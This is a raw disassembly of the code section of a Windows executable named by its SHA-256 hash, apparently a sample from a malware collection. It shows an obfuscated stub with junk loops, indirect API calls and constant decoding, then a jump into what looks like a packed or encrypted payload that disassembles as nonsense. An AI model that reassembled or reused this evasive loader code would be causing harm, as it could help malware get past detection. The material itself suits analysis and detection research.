
94d638cb2f83cbae293aaeecf8cc2764c631d705b2a5d5c81fe2f1edc9f7d139.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x90
  401009:	push   esi
  40100a:	and    DWORD PTR ds:0x42a010,0x0
  401014:	jmp    0x401024
  401019:	mov    eax,ds:0x42a010
  40101e:	inc    eax
  40101f:	mov    ds:0x42a010,eax
  401024:	cmp    DWORD PTR ds:0x42a010,0x1d
  40102b:	jae    0x401072
  401031:	cmp    DWORD PTR ds:0x42a010,0xc
  401038:	jne    0x40104c
  40103e:	push   0x42900c
  401043:	push   DWORD PTR [ebp-0x18]
  401046:	call   DWORD PTR ds:0x424014
  40104c:	cmp    DWORD PTR ds:0x42a010,0xb
  401053:	jne    0x401067
  401059:	xor    eax,eax
  40105b:	xor    eax,DWORD PTR ds:0x42a010
  401061:	inc    eax
  401062:	mov    ds:0x42a010,eax
  401067:	jmp    0x401019
  40106c:	adc    ecx,0xcd5
  401072:	push   edi
  401073:	mov    DWORD PTR ds:0x42b004,0x1e
  40107d:	cmp    DWORD PTR ds:0x42b004,0x0
  401084:	je     0x4010e3
  40108a:	cmp    DWORD PTR ds:0x42b004,0x2b
  401091:	jne    0x4010bf
  401097:	push   DWORD PTR [ebp-0x10]
  40109a:	push   0x42b010
  40109f:	push   0x2447
  4010a4:	push   0x42b00c
  4010a9:	push   0x8949
  4010ae:	push   DWORD PTR [ebp-0x14]
  4010b1:	push   DWORD PTR [ebp-0x10]
  4010b4:	push   0x13a5
  4010b9:	call   DWORD PTR ds:0x424018
  4010bf:	xor    esi,esi
  4010c1:	or     esi,DWORD PTR ds:0x42b004
  4010c7:	dec    esi
  4010c8:	mov    DWORD PTR ds:0x42b004,esi
  4010ce:	jmp    0x40107d
  4010d3:	mov    eax,ds:0x42a004
  4010d8:	adc    eax,DWORD PTR ds:0x42b00c
  4010de:	mov    ds:0x42a004,eax
  4010e3:	mov    eax,ds:0x421c66
  4010e8:	mov    DWORD PTR [ebp-0x2c],eax
  4010eb:	and    DWORD PTR ds:0x428010,0x0
  4010f5:	mov    ecx,DWORD PTR ds:0x428010
  4010fb:	inc    ecx
  4010fc:	mov    DWORD PTR ds:0x428010,ecx
  401102:	cmp    DWORD PTR ds:0x428010,0x2d
  401109:	jne    0x401118
  40110f:	push   DWORD PTR [ebp-0xc]
  401112:	call   DWORD PTR ds:0x42401c
  401118:	cmp    DWORD PTR ds:0x428010,0x1f
  40111f:	jb     0x4010f5
  401125:	mov    eax,ds:0x421d72
  40112a:	and    DWORD PTR ds:0x42b008,ebx
  401130:	mov    DWORD PTR [ebp-0x3c],eax
  401133:	sbb    DWORD PTR ds:0x42b010,ebx
  401139:	and    DWORD PTR [ebp-0x34],0x0
  40113d:	or     eax,0x2114
  401142:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  401149:	xor    eax,eax
  40114b:	or     eax,DWORD PTR ds:0x429008
  401151:	xor    DWORD PTR ds:0x428008,eax
  401157:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40115e:	mov    eax,DWORD PTR [ebp-0x1c]
  401161:	add    edi,DWORD PTR ds:0x429008
  401167:	mov    ecx,DWORD PTR [ebp-0x1c]
  40116a:	add    edi,esi
  40116c:	xor    eax,ecx
  40116e:	add    DWORD PTR ds:0x428024,edx
  401174:	mov    DWORD PTR [ebp-0x1c],eax
  401177:	and    DWORD PTR ds:0x42c000,0x0
  401181:	xor    eax,eax
  401183:	or     eax,DWORD PTR ds:0x42c000
  401189:	inc    eax
  40118a:	mov    ds:0x42c000,eax
  40118f:	cmp    DWORD PTR ds:0x42c000,0x19
  401196:	jne    0x4011a8
  40119c:	push   DWORD PTR [ebp-0x1c]
  40119f:	push   DWORD PTR [ebp-0xc]
  4011a2:	call   DWORD PTR ds:0x424020
  4011a8:	cmp    DWORD PTR ds:0x42c000,0x14
  4011af:	jb     0x401181
  4011b5:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  4011bc:	xor    DWORD PTR ds:0x428014,0x3e14
  4011c6:	mov    eax,DWORD PTR [ebp-0x28]
  4011c9:	sbb    edi,ecx
  4011cb:	mov    ecx,DWORD PTR [ebp-0x28]
  4011ce:	and    DWORD PTR ds:0x42a008,0x0
  4011d8:	mov    esi,DWORD PTR ds:0x42a008
  4011de:	inc    esi
  4011df:	mov    DWORD PTR ds:0x42a008,esi
  4011e5:	cmp    DWORD PTR ds:0x42a008,0x7
  4011ec:	jne    0x40121a
  4011f2:	push   0x42b018
  4011f7:	push   0x2bd6
  4011fc:	push   DWORD PTR [ebp-0x14]
  4011ff:	push   0x428004
  401204:	push   DWORD PTR [ebp-0x20]
  401207:	push   0x4237f2
  40120c:	push   0x1e5d
  401211:	push   DWORD PTR [ebp-0x28]
  401214:	call   DWORD PTR ds:0x424024
  40121a:	cmp    DWORD PTR ds:0x42a008,0x6
  401221:	jne    0x401234
  401227:	mov    esi,DWORD PTR ds:0x42a008
  40122d:	inc    esi
  40122e:	mov    DWORD PTR ds:0x42a008,esi
  401234:	cmp    DWORD PTR ds:0x42a008,0x16
  40123b:	jb     0x4011d8
  401241:	sub    DWORD PTR ds:0x42c00c,0x2ac6
  40124b:	xor    eax,ecx
  40124d:	dec    ecx
  40124e:	mov    DWORD PTR [ebp-0x28],eax
  401251:	and    DWORD PTR ds:0x428018,0x0
  40125b:	jmp    0x40126d
  401260:	mov    edi,DWORD PTR ds:0x428018
  401266:	inc    edi
  401267:	mov    DWORD PTR ds:0x428018,edi
  40126d:	cmp    DWORD PTR ds:0x428018,0x1f
  401274:	jae    0x4012b7
  40127a:	cmp    DWORD PTR ds:0x428018,0x11
  401281:	jne    0x401298
  401287:	push   0x4738
  40128c:	push   DWORD PTR [ebp-0x10]
  40128f:	push   DWORD PTR [ebp-0x24]
  401292:	call   DWORD PTR ds:0x424028
  401298:	cmp    DWORD PTR ds:0x428018,0x10
  40129f:	jne    0x4012b2
  4012a5:	mov    edi,DWORD PTR ds:0x428018
  4012ab:	inc    edi
  4012ac:	mov    DWORD PTR ds:0x428018,edi
  4012b2:	jmp    0x401260
  4012b7:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4012be:	mov    eax,DWORD PTR [ebp-0x18]
  4012c1:	and    DWORD PTR ds:0x428020,0x0
  4012cb:	mov    ecx,DWORD PTR ds:0x428020
  4012d1:	inc    ecx
  4012d2:	mov    DWORD PTR ds:0x428020,ecx
  4012d8:	cmp    DWORD PTR ds:0x428020,0x15
  4012df:	jne    0x4012f5
  4012e5:	push   0x4238b9
  4012ea:	push   0x42393d
  4012ef:	call   DWORD PTR ds:0x424030
  4012f5:	cmp    DWORD PTR ds:0x428020,0x14
  4012fc:	jb     0x4012cb
  401302:	mov    ecx,DWORD PTR [ebp-0x18]
  401305:	and    DWORD PTR ds:0x42b000,0x0
  40130f:	jmp    0x401321
  401314:	mov    edi,DWORD PTR ds:0x42b000
  40131a:	inc    edi
  40131b:	mov    DWORD PTR ds:0x42b000,edi
  401321:	cmp    DWORD PTR ds:0x42b000,0x19
  401328:	jae    0x401378
  40132e:	cmp    DWORD PTR ds:0x42b000,0xa
  401335:	jne    0x401359
  40133b:	push   DWORD PTR [ebp-0x18]
  40133e:	push   0x3609
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   DWORD PTR [ebp-0x18]
  401349:	push   0x6b70
  40134e:	push   0x42901c
  401353:	call   DWORD PTR ds:0x424038
  401359:	cmp    DWORD PTR ds:0x42b000,0x9
  401360:	jne    0x401373
  401366:	mov    edi,DWORD PTR ds:0x42b000
  40136c:	inc    edi
  40136d:	mov    DWORD PTR ds:0x42b000,edi
  401373:	jmp    0x401314
  401378:	xor    eax,ecx
  40137a:	mov    DWORD PTR [ebp-0x18],eax
  40137d:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  401384:	mov    eax,DWORD PTR [ebp-0x24]
  401387:	mov    ecx,DWORD PTR [ebp-0x24]
  40138a:	xor    eax,ecx
  40138c:	mov    DWORD PTR [ebp-0x24],eax
  40138f:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  401396:	mov    eax,DWORD PTR [ebp-0x14]
  401399:	mov    ecx,DWORD PTR [ebp-0x14]
  40139c:	xor    eax,ecx
  40139e:	mov    DWORD PTR [ebp-0x14],eax
  4013a1:	mov    eax,DWORD PTR [ebp-0x20]
  4013a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4013a7:	mov    esi,0x7510893
  4013ac:	xor    eax,esi
  4013ae:	mov    edi,0x3272db
  4013b3:	add    eax,edi
  4013b5:	xor    eax,ecx
  4013b7:	mov    DWORD PTR [ebp-0x14],eax
  4013ba:	mov    eax,DWORD PTR [ebp-0x10]
  4013bd:	mov    ecx,DWORD PTR [ebp-0x10]
  4013c0:	sub    eax,ecx
  4013c2:	mov    DWORD PTR [ebp-0x10],eax
  4013c5:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4013cc:	mov    al,BYTE PTR [ebp-0x1]
  4013cf:	movzx  ecx,BYTE PTR [ebp-0x1]
  4013d3:	movzx  eax,al
  4013d6:	sub    ecx,eax
  4013d8:	mov    BYTE PTR [ebp-0x1],cl
  4013db:	movzx  eax,BYTE PTR [ebp-0x1]
  4013df:	xor    eax,0xffffff99
  4013e2:	mov    BYTE PTR [ebp-0x1],al
  4013e5:	mov    eax,DWORD PTR [ebp-0x20]
  4013e8:	xor    eax,esi
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0x14],eax
  4013ef:	lea    eax,[ebp-0x40]
  4013f2:	mov    DWORD PTR [ebp-0x38],eax
  4013f5:	lea    eax,[ebp-0x38]
  4013f8:	mov    DWORD PTR [ebp-0x44],eax
  4013fb:	lea    eax,[ebp-0x44]
  4013fe:	mov    DWORD PTR [ebp-0x8],eax
  401401:	lea    eax,[ebp-0x8]
  401404:	mov    DWORD PTR [ebp-0x48],eax
  401407:	mov    eax,DWORD PTR [ebp-0x18]
  40140a:	xor    eax,esi
  40140c:	add    eax,edi
  40140e:	push   eax
  40140f:	mov    eax,DWORD PTR [ebp-0x1c]
  401412:	xor    eax,esi
  401414:	add    eax,edi
  401416:	push   eax
  401417:	mov    eax,DWORD PTR [ebp-0x10]
  40141a:	xor    eax,esi
  40141c:	add    eax,edi
  40141e:	push   eax
  40141f:	lea    eax,[ebp-0x90]
  401425:	push   eax
  401426:	push   DWORD PTR [ebp-0x20]
  401429:	push   DWORD PTR [ebp-0x30]
  40142c:	jmp    0x4037ee
  401431:	mov    al,0x4c
  401433:	cmp    BYTE PTR [edx+0x44b086b4],cl
  401439:	ss ins DWORD PTR es:[edi],dx
  40143b:	dec    edi
  40143c:	clc    
  40143d:	dec    esi
  40143e:	xchg   esi,eax
  40143f:	jo     0x401413
  401441:	bound  esp,QWORD PTR [edx+0x62]
  401444:	(bad)  
  401445:	fstp   QWORD PTR [edi+0x62]
  401448:	bound  ecx,QWORD PTR [ecx]
  40144a:	sub    DWORD PTR [edi],eax
  40144c:	pop    eax
  40144d:	add    eax,0x792e0358
  401452:	pop    ecx
  401453:	jne    0x40149a
  401455:	int    0xe1
  401457:	jb     0x40149b
  401459:	jno    0x401482
  40145b:	into   
  40145c:	push   eax
  40145d:	hlt    
  40145e:	and    al,0xd4
  401460:	xchg   ecx,eax
  401461:	fbstp  TBYTE PTR ds:0x1153c2c8
  401467:	icebp  
  401468:	aaa    
  401469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40146a:	add    DWORD PTR [edx-0x9],ebx
  40146d:	mov    al,ds:0xb465e64e
  401472:	in     al,dx
  401473:	(bad)  
  401474:	pop    eax
  401475:	cmp    esi,esi
  401477:	pushf  
  401478:	mov    ds:0x6b01003,eax
  40147d:	add    DWORD PTR [ebx-0x153fb6cb],0xa
  401484:	(bad)  
  401485:	scas   al,BYTE PTR es:[edi]
  401486:	sahf   
  401487:	test   eax,0x86999f74
  40148c:	js     0x4014a2
  40148e:	iret   
  40148f:	mov    edx,0xac6df4d7
  401494:	test   eax,0xdc9e713b
  401499:	xlat   BYTE PTR ds:[ebx]
  40149a:	rcr    BYTE PTR [esi+ebp*4+0x44a3fedb],0xc2
  4014a2:	aam    0x3
  4014a4:	dec    ebx
  4014a5:	std    
  4014a6:	mov    al,0x60
  4014a8:	in     eax,dx
  4014a9:	fbstp  TBYTE PTR [edx+0x7a8c4260]
  4014af:	push   ds
  4014b0:	pusha  
  4014b1:	stc    
  4014b2:	mov    al,ds:0x958913e5
  4014b7:	cmp    eax,0x95de469d
  4014bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014bd:	loope  0x4014a5
  4014bf:	ret    0xfb84
  4014c2:	push   ecx
  4014c3:	sub    eax,0x8f09f6d7
  4014c8:	(bad)  
  4014c9:	jmp    0x36a88a81
  4014ce:	pop    eax
  4014cf:	or     cl,dh
  4014d1:	inc    edx
  4014d2:	ins    BYTE PTR es:[edi],dx
  4014d3:	stos   BYTE PTR es:[edi],al
  4014d4:	cdq    
  4014d5:	aad    0x77
  4014d7:	dec    edi
  4014d8:	pop    edi
  4014d9:	xor    DWORD PTR [ebp-0x3051591a],edx
  4014df:	test   eax,0x67fbb6c2
  4014e4:	mov    edx,0x53fb3792
  4014e9:	rcr    BYTE PTR [ecx],cl
  4014eb:	out    dx,al
  4014ec:	pop    edx
  4014ed:	idiv   dl
  4014ef:	xor    al,cl
  4014f1:	lods   al,BYTE PTR ds:[esi]
  4014f2:	inc    esi
  4014f3:	xor    DWORD PTR [ecx+edi*4+0x13356d7f],ecx
  4014fa:	cmc    
  4014fb:	jne    0x4014ab
  4014fd:	push   cs
  4014fe:	push   0x3f96bf88
  401503:	xchg   edx,eax
  401504:	ins    DWORD PTR es:[edi],dx
  401505:	js     0x4014fd
  401507:	fstp   QWORD PTR [ebx+eax*1]
  40150a:	call   0xae0696ac
  40150f:	repnz lods al,BYTE PTR fs:[esi]
  401512:	idiv   ebp
  401514:	jmp    0x8dc7:0x730d9f46
  40151b:	or     esi,DWORD PTR [edx-0x5d]
  40151e:	lea    ebx,[eax+0x235a5aa2]
  401524:	push   eax
  401525:	mov    eax,0xa312fe1d
  40152a:	std    
  40152b:	leave  
  40152c:	xor    ebx,DWORD PTR [edi-0x7200859]
  401532:	sub    eax,0xadb61717
  401537:	xor    eax,0xef12ba39
  40153c:	icebp  
  40153d:	jns    0x4015bd
  40153f:	push   0x635912a9
  401544:	repz scas al,BYTE PTR es:[edi]
  401546:	push   ecx
  401547:	sub    BYTE PTR [esi-0x54],bh
  40154a:	mov    BYTE PTR ds:0xe6745f6a,cl
  401550:	mov    eax,ds:0xd0f5ed14
  401555:	lods   al,BYTE PTR ds:[esi]
  401556:	leave  
  401557:	mov    eax,0x891006b5
  40155c:	mov    ch,0xf6
  40155e:	call   0xbd29f3a6
  401563:	popa   
  401564:	dec    esp
  401565:	(bad)  
  401566:	cwde   
  401567:	mov    BYTE PTR [esi],ah
  401569:	test   DWORD PTR [esi+0xc],ebx
  40156c:	mov    eax,ds:0xbe8fa577
  401571:	jle    0x401576
  401573:	pop    es
  401574:	aaa    
  401575:	test   eax,0xb39469a7
  40157a:	push   cs
  40157b:	addr16 mov ebx,0xb225d251
  401581:	ror    bh,1
  401583:	ror    BYTE PTR [ecx],1
  401585:	jmp    0x40159c
  401587:	mov    esi,0xc5618dba
  40158c:	lahf   
  40158d:	sub    dl,BYTE PTR [esi+edi*1-0x2f9f6379]
  401594:	pop    esi
  401595:	es push ebp
  401597:	jmp    0xdb72:0x183ec934
  40159e:	jmp    0x40157e
  4015a0:	jbe    0x40156c
  4015a2:	cs xor eax,0xeb47dd06
  4015a8:	sbb    al,0x12
  4015aa:	push   esi
  4015ab:	mov    ds:0xba02b56f,al
  4015b0:	xor    al,BYTE PTR [edi-0x6bb88e02]
  4015b6:	push   ds
  4015b7:	cli    
  4015b8:	mov    ah,BYTE PTR [eax+0x2495a117]
  4015be:	sbb    al,0xf9
  4015c0:	imul   ecx,DWORD PTR [ebp+0x243a0f64],0xe5422d5c
  4015ca:	(bad)  
  4015cb:	mov    ?,WORD PTR [ecx+0x45]
  4015ce:	int3   
  4015cf:	mov    eax,0x360164fc
  4015d4:	pop    esp
  4015d5:	add    esp,DWORD PTR ds:0x8e87853c
  4015db:	fistp  DWORD PTR [edi-0xe]
  4015de:	adc    eax,0x3ffee8e2
  4015e3:	aad    0x99
  4015e5:	(bad)  
  4015e6:	push   esi
  4015e7:	mov    DWORD PTR [esi+0x4ca61ac5],eax
  4015ed:	aad    0x9d
  4015ef:	fcom   DWORD PTR [esi-0x1]
  4015f2:	jb     0x4015af
  4015f4:	sbb    eax,0x95cbca3b
  4015f9:	mov    eax,0x472a1c89
  4015fe:	jo     0x4015d9
  401600:	pop    ds
  401601:	mov    edx,esp
  401603:	jmp    0xbde2eab3
  401608:	xor    DWORD PTR ss:[eax+0xa],esi
  40160c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40160d:	mov    esp,0x66eff041
  401612:	pop    ds
  401613:	cmp    bl,BYTE PTR [edx]
  401615:	into   
  401616:	sub    BYTE PTR [edi+0xfe0918e],0xf5
  40161d:	inc    ecx
  40161e:	dec    eax
  40161f:	fimul  WORD PTR [ebx+edi*2]
  401622:	cmp    al,0x0
  401624:	mov    ch,0x91
  401626:	push   cs
  401627:	or     al,BYTE PTR [edx-0x5533d7eb]
  40162d:	xchg   ebx,eax
  40162e:	fs jmp 0xaaa41556
  401634:	pop    ss
  401635:	imul   ebx,DWORD PTR [ecx],0x31
  401638:	imul   DWORD PTR [edx+0x26202e40]
  40163e:	retf   
  40163f:	push   eax
  401640:	push   ds
  401641:	and    BYTE PTR [eax+0x58188644],al
  401647:	xchg   ebp,eax
  401648:	jnp    0x401656
  40164a:	jecxz  0x4016be
  40164c:	push   0x34
  40164e:	jl     0xbea56ed7
  401654:	mov    ebp,0x585228b5
  401659:	push   edi
  40165a:	push   ebx
  40165b:	mov    eax,0x6588c7f3
  401660:	shl    DWORD PTR [edx],cl
  401662:	loope  0x40166d
  401664:	cmp    dl,BYTE PTR [edx+0x792eacba]
  40166a:	mov    edx,fs
  40166c:	test   BYTE PTR [ecx],ah
  40166e:	add    eax,0x8512f7fa
  401673:	pop    ss
  401674:	mov    al,0xe4
  401676:	push   edi
  401677:	jmp    0x9e8cbfd4
  40167c:	test   DWORD PTR [ecx+0x24e9ee6d],eax
  401682:	xor    eax,0x73186286
  401687:	into   
  401688:	adc    eax,esp
  40168a:	pop    ss
  40168b:	dec    ecx
  40168c:	das    
  40168d:	cwde   
  40168e:	sub    al,0x96
  401690:	dec    eax
  401691:	or     ah,BYTE PTR [eax+0x66]
  401694:	jbe    0x40163d
  401696:	push   ebp
  401697:	xchg   ebx,eax
  401698:	cmp    BYTE PTR [edx+eiz*1-0x13],0x2c
  40169d:	(bad)
  4016a0:	add    BYTE PTR [ecx],bh
  4016a2:	jno    0x4016e4
  4016a4:	or     DWORD PTR [ecx],edx
  4016a6:	rol    BYTE PTR [eax],cl
  4016a8:	(bad)  
  4016a9:	repnz cmp BYTE PTR [edi],ch
  4016ac:	enter  0xf082,0x21
  4016b0:	cmp    al,0xd
  4016b2:	push   es
  4016b3:	dec    esi
  4016b4:	mov    ds:0x407c03bd,al
  4016b9:	fcom   DWORD PTR [edx-0x2de9632c]
  4016bf:	cmp    eax,0x32c9a521
  4016c4:	pop    es
  4016c5:	loop   0x401706
  4016c7:	aaa    
  4016c8:	or     DWORD PTR [ecx-0x17],edx
  4016cb:	push   0x826c5534
  4016d0:	jmp    0xa08f9fed
  4016d5:	jmp    0x401733
  4016d7:	cdq    
  4016d8:	inc    ecx
  4016d9:	push   edx
  4016da:	rcl    eax,1
  4016dc:	ins    BYTE PTR es:[edi],dx
  4016dd:	push   cs
  4016de:	fistp  DWORD PTR ds:0x8f9013a5
  4016e4:	loopne 0x4016cd
  4016e6:	out    dx,al
  4016e7:	push   0x77088adb
  4016ec:	shl    BYTE PTR [eax+eiz*1],cl
  4016ef:	cmp    eax,0xe2b37203
  4016f4:	bound  eax,QWORD PTR [ecx+0x67a7f900]
  4016fa:	lds    esp,FWORD PTR [ebp+0x3f]
  4016fd:	fisub  WORD PTR [edi-0x66b3b407]
  401703:	mov    dl,0xf0
  401705:	sbb    cl,BYTE PTR [ecx+eiz*1-0x33de8531]
  40170c:	scas   al,BYTE PTR es:[edi]
  40170d:	inc    esp
  40170e:	jmp    0x6db:0x35a98e8a
  401715:	xchg   ecx,eax
  401716:	mov    ah,0x8c
  401718:	(bad)  
  401719:	in     eax,dx
  40171a:	and    BYTE PTR [eax+edi*4+0x262963f4],ch
  401721:	or     ah,ch
  401723:	das    
  401724:	mov    al,0x3d
  401726:	xchg   cl,cl
  401728:	sub    BYTE PTR [esi+0x499e8ac0],cl
  40172e:	jmp    0xc7a30e89
  401733:	(bad)
  401736:	pop    esp
  401737:	(bad)  
  401738:	test   DWORD PTR [eax],esi
  40173a:	sbb    DWORD PTR [edi-0x3a],0x2f
  40173e:	cmp    ebp,edi
  401740:	icebp  
  401741:	hlt    
  401742:	push   ecx
  401743:	jle    0x40177b
  401745:	fcomp  DWORD PTR [ebx]
  401747:	sub    al,0x25
  401749:	xor    ebp,DWORD PTR [edx]
  40174b:	push   ss
  40174c:	mov    ebp,0xc2bbf5d
  401751:	pop    es
  401752:	icebp  
  401753:	inc    esp
  401754:	iret   
  401755:	add    eax,0xd262efc8
  40175a:	shl    dl,1
  40175c:	imul   edi,DWORD PTR [eax+esi*2],0x73b4696a
  401763:	addr16 dec eax
  401765:	adc    ebp,esp
  401767:	mov    ah,0x6d
  401769:	outs   dx,BYTE PTR ds:[esi]
  40176a:	and    eax,DWORD PTR [edi]
  40176c:	xchg   edx,eax
  40176d:	adc    BYTE PTR gs:[ebx+0x79dea546],bh
  401774:	push   ss
  401775:	xrelease xchg BYTE PTR [ebp-0x3],ah
  401779:	call   0xc01b:0x38584f4b
  401780:	lods   al,BYTE PTR ds:[esi]
  401781:	adc    al,0x95
  401783:	push   eax
  401784:	fstp   QWORD PTR [ebx*1+0x301c6177]
  40178b:	cmp    eax,0x7585054
  401790:	xor    eax,0xb2ccce57
  401795:	xchg   ebx,eax
  401796:	xchg   esp,eax
  401797:	pop    ebp
  401798:	and    dh,ah
  40179a:	stc    
  40179b:	fdivr  DWORD PTR [esi]
  40179d:	xchg   edi,eax
  40179e:	cwde   
  40179f:	rcl    dl,cl
  4017a1:	imul   esi,DWORD PTR [edx+edx*4-0x1f],0xffffffb7
  4017a6:	xor    DWORD PTR [edx+0x67],0xa77bd395
  4017ad:	add    BYTE PTR [ebp+0x35],0x1c
  4017b1:	(bad)
  4017b4:	or     DWORD PTR [eax-0x68],ecx
  4017b7:	mov    esi,0x8b5a845d
  4017bc:	cld    
  4017bd:	shl    DWORD PTR [ebx+0x7c],1
  4017c0:	hlt    
  4017c1:	dec    esi
  4017c2:	inc    edx
  4017c3:	ja     0x40178b
  4017c5:	je     0x4017f2
  4017c7:	inc    edx
  4017c8:	fild   QWORD PTR [eax-0xb]
  4017cb:	push   esp
  4017cc:	jl     0x401787
  4017ce:	test   DWORD PTR [ebp-0x2e],esp
  4017d1:	sbb    dl,BYTE PTR [ebx+eiz*1-0x6457cc22]
  4017d8:	stos   DWORD PTR es:[edi],eax
  4017d9:	out    0x86,al
  4017db:	cmp    eax,0xa708f084
  4017e0:	pop    ebx
  4017e1:	xor    DWORD PTR [esi-0x7],ebp
  4017e4:	das    
  4017e5:	adc    DWORD PTR [edx+0x19],esp
  4017e8:	xchg   DWORD PTR [esi+0x7193eb29],eax
  4017ee:	fcmovnu st,st(7)
  4017f0:	push   edx
  4017f1:	div    BYTE PTR [eax]
  4017f3:	aad    0x69
  4017f5:	mov    ah,0x65
  4017f7:	scas   eax,DWORD PTR es:[edi]
  4017f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017f9:	sub    DWORD PTR [ecx-0x4a67e508],0xffffffb7
  401800:	sub    eax,0xf12d5b11
  401805:	add    ah,BYTE PTR [edi+ecx*4-0x17]
  401809:	icebp  
  40180a:	xlat   BYTE PTR ds:[ebx]
  40180b:	cwde   
  40180c:	and    ch,al
  40180e:	pop    eax
  40180f:	mov    ds:0x4f7cc407,eax
  401814:	in     eax,dx
  401815:	mov    bl,0xdf
  401817:	sub    eax,0x3ddd6773
  40181c:	stc    
  40181d:	xlat   BYTE PTR ds:[ebx]
  40181e:	ins    BYTE PTR es:[edi],dx
  40181f:	stos   BYTE PTR es:[edi],al
  401820:	test   bl,0x34
  401823:	daa    
  401824:	add    edi,edi
  401826:	stos   BYTE PTR es:[edi],al
  401827:	in     al,0x58
  401829:	dec    ebp
  40182a:	add    esp,DWORD PTR ds:0xb91ee517
  401830:	inc    esp
  401831:	in     al,dx
  401832:	in     eax,0x39
  401834:	dec    ebp
  401835:	dec    esi
  401836:	push   ss
  401837:	lea    ebx,[eax]
  401839:	push   esp
  40183a:	mov    edx,0x839f3ed5
  40183f:	mov    esp,0x710c203f
  401844:	dec    esp
  401845:	(bad)  
  401847:	mov    WORD PTR [ecx+edi*2+0x1e8d8764],es
  40184e:	xchg   edi,eax
  40184f:	scas   eax,DWORD PTR es:[edi]
  401850:	inc    ecx
  401851:	push   esp
  401852:	inc    eax
  401853:	(bad)  
  401854:	out    dx,eax
  401855:	imul   esi,DWORD PTR ds:0xa9e7fcde,0x27b390e6
  40185f:	add    eax,0xfe081399
  401864:	xlat   BYTE PTR gs:[ebx]
  401866:	in     eax,0xc0
  401868:	hlt    
  401869:	mov    BYTE PTR [edi-0x1dc58a36],0x27
  401870:	sub    eax,0x1ef97228
  401875:	cwde   
  401876:	gs call 0x78e76eaf
  40187c:	xchg   DWORD PTR [edx-0x1e],ecx
  40187f:	push   ebx
  401880:	test   eax,0xedd527ae
  401885:	sub    DWORD PTR [ebp+0x57],ebx
  401888:	xchg   edi,eax
  401889:	or     edi,esp
  40188b:	clc    
  40188c:	adc    al,0xa9
  40188e:	jno    0x401847
  401890:	or     ebp,esi
  401892:	ret    
  401893:	add    al,0xe6
  401895:	idiv   ecx
  401897:	cmp    ch,bh
  401899:	je     0x401862
  40189b:	pop    ss
  40189c:	pop    es
  40189d:	jge    0x401884
  40189f:	mov    bl,0x6c
  4018a1:	inc    esp
  4018a2:	in     al,dx
  4018a3:	cmp    cl,BYTE PTR [ecx+0x64]
  4018a6:	cli    
  4018a7:	cmp    al,0xdb
  4018a9:	jp     0x401846
  4018ab:	out    0x35,eax
  4018ad:	inc    esp
  4018ae:	add    al,0x9f
  4018b0:	mov    edi,0xef121286
  4018b5:	jbe    0x4018a1
  4018b7:	pop    ebp
  4018b8:	jl     0x401864
  4018ba:	mov    BYTE PTR [edi+edi*8+0x3f818c24],0xc3
  4018c2:	iret   
  4018c3:	fmul   DWORD PTR [ecx-0x3e]
  4018c6:	daa    
  4018c7:	cmc    
  4018c8:	pop    es
  4018c9:	fdivr  st,st(5)
  4018cb:	out    dx,al
  4018cc:	cmp    eax,0x9756a4ea
  4018d1:	mov    ch,BYTE PTR [eax]
  4018d3:	test   bh,0xc6
  4018d6:	sub    bh,BYTE PTR [eax-0x52de8c94]
  4018dc:	iret   
  4018dd:	dec    ebp
  4018de:	push   ss
  4018df:	mov    esi,0xa424473e
  4018e4:	xor    DWORD PTR [edx+edi*4-0x8],ebx
  4018e8:	arpl   WORD PTR [esi+0x33],bx
  4018eb:	(bad)  
  4018ed:	cld    
  4018ee:	inc    edi
  4018ef:	jmp    0x4018b7
  4018f1:	(bad)  
  4018f2:	pop    ecx
  4018f3:	pop    ebp
  4018f4:	popf   
  4018f5:	cmc    
  4018f6:	in     al,dx
  4018f7:	sahf   
  4018f8:	dec    edx
  4018f9:	push   ss
  4018fa:	inc    bx
  4018fc:	adc    eax,0xbaef701f
  401901:	es xor esi,edi
  401904:	pop    ebp
  401905:	and    al,BYTE PTR [ebx+0x7684f2ab]
  40190b:	sub    eax,esi
  40190d:	dec    esi
  40190e:	mov    ds:0xfc127430,al
  401913:	call   0x4cd7b789
  401918:	or     dl,BYTE PTR [ebp+0x1c41871d]
  40191e:	add    al,0xf4
  401920:	dec    ebx
  401921:	or     esi,ebx
  401923:	xor    al,0x20
  401925:	or     DWORD PTR [eax+0x72],eax
  401928:	cdq    
  401929:	sar    DWORD PTR [edi],0x46
  40192c:	mov    ebp,0xf6b0d67b
  401931:	xchg   ecx,eax
  401932:	adc    bl,ah
  401934:	ss aas 
  401936:	and    ecx,esi
  401938:	(bad)  
  40193a:	test   DWORD PTR [edx-0x521ecb64],edx
  401940:	mov    esi,0x467d9772
  401945:	push   ss
  401946:	jp     0x401992
  401948:	bound  esp,QWORD PTR [ebx]
  40194a:	mov    edx,0xcc77f798
  40194f:	add    al,0xdf
  401951:	out    0xd5,al
  401953:	std    
  401954:	test   BYTE PTR [ebp-0x47],dl
  401957:	cmp    DWORD PTR [ebp+0x0],edx
  40195a:	sub    eax,DWORD PTR [ecx]
  40195c:	xor    al,0xbb
  40195e:	inc    eax
  40195f:	sbb    BYTE PTR [eax-0x32e2fd0d],0xca
  401966:	pop    ecx
  401967:	adc    al,0xb7
  401969:	push   0xffffffab
  40196b:	xchg   esi,eax
  40196c:	adc    DWORD PTR [edx+0x5526e9d6],0x3cbdb906
  401976:	jle    0x401984
  401978:	mov    esi,0x814aebbc
  40197d:	and    bh,BYTE PTR [ecx+ecx*8-0x72]
  401981:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401982:	loope  0x401968
  401984:	push   edi
  401985:	into   
  401986:	out    dx,eax
  401987:	lods   al,BYTE PTR ds:[esi]
